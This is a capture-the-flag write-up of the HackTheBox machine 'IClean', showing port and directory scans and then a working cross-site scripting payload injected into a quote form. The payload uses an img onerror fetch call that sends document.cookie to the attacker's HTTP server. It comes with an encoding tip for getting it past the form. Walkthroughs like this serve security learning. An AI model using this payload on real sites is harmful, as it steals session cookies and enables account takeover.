---
layout: article
title:  "IClean - HackTheBox Writeup"
date: "2024-05-18"
image: "/assets/img/iclean/homepage.png"
tags: ["linux", "website", "xss", "cookies"]
---


IClean is a box in HackTheBox that features XSS vulnerabilities...

Port scan the machine.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nmap -sVC 10.10.11.12   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 12:46 CDT
Nmap scan report for capiclean.htb (10.10.11.12)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.3.7 Python/3.10.12
|_http-title: Capiclean
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}
</div>

Let's go to port 80.

<div class="article-image">
  <img src="/assets/img/iclean/homepage.png">
  <p>home page</p>
</div>

Looks like a company that offers cleaning services.

The website has /login and a /quote page with a form.

Let's run dirb to scan the website for more directories.

<div class="article-code">
{% highlight sh %}
jeanp@~$ dirb http://capiclean.htb/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May 18 15:05:00 2024
URL_BASE: http://capiclean.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://capiclean.htb/ ----
+ http://capiclean.htb/about (CODE:200|SIZE:5267)                                                 
+ http://capiclean.htb/dashboard (CODE:302|SIZE:189)                                              
+ http://capiclean.htb/login (CODE:200|SIZE:2106)                                                 
+ http://capiclean.htb/logout (CODE:302|SIZE:189)                                                 
+ http://capiclean.htb/quote (CODE:200|SIZE:2237)                                                 
+ http://capiclean.htb/server-status (CODE:403|SIZE:278)                                          
+ http://capiclean.htb/services (CODE:200|SIZE:8592)                                              
+ http://capiclean.htb/team (CODE:200|SIZE:8109)                                                  
                                                                                                  
-----------------
END_TIME: Sat May 18 15:11:13 2024
DOWNLOADED: 4612 - FOUND: 8
{% endhighlight %}
</div>

Dirb found /dashboard, but this is a 302 code, a redirect, so I'm not sure what our options are here, maybe the backend code makes this path do a redirect when no cookie is set in the headers. We also have /server-status, but it returns Forbidden, not Unauthorized.

The login form doesn't seem to be vulnerable to SQLis, I tried passing queries listed on [PortSwigger's][PortSwigger] website but no results.

<div class="article-image">
  <img src="/assets/img/iclean/sqli.png">
  <p>/login</p>
</div>

Let's stick with trying to steal cookies exploiting XSS. The only form we can try this on is /quote

<div class="article-image">
  <img src="/assets/img/iclean/quote.png">
  <p>/quote</p>
</div>

<div class="article-image">
  <img src="/assets/img/iclean/thankyou.png">
  <p>/sendMessage</p>
</div>

Looks like the quote request is sent to the management team, we can maybe steal their cookies by sending some scripts with the forms.

Let's try opening and python http server and use the `fetch()` function from javascript in both fields.

<div class="article-code">
{% highlight sh %}
jeanp@~$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endhighlight %}
</div>

<div class="article-image">
  <img src="/assets/img/iclean/scripttag.png">
</div>

This script did not work. Could be the case that the `<script>` tags are filtered and sanitized. Let's try with another approach.

<div class="article-image">
  <img src="/assets/img/iclean/imgscript.png">
</div>

The `img` element has no valid `src`, so the browser returns an error, which makes the `fetch()` function run.

<div class="article-image">
  <img src="/assets/img/iclean/pythonserver.png">
</div>

We get the request.

The service parameter is the one that's vulnerable to XSS, so remove the `img` element from the email field and edit the `fetch()` call to get cookies.

<div class="article-code">
{% highlight javascript %}
<img src=x onerror=fetch('http://10.10.14.142:8000/'+document.cookie);>
{% endhighlight %}
</div>

Since the `+` sign represents a space character when the `Content-Type` of the request is URL-encoded, replace it with `%2b` to avoid breaking the fetch call.

<div class="article-image">
  <img src="/assets/img/iclean/documentcookie.png">
</div>

<div class="article-image">
  <img src="/assets/img/iclean/cookie.png">
</div>

We get the cookie.












































[PortSwigger]: https://portswigger.net/support/using-sql-injection-to-bypass-authentication




























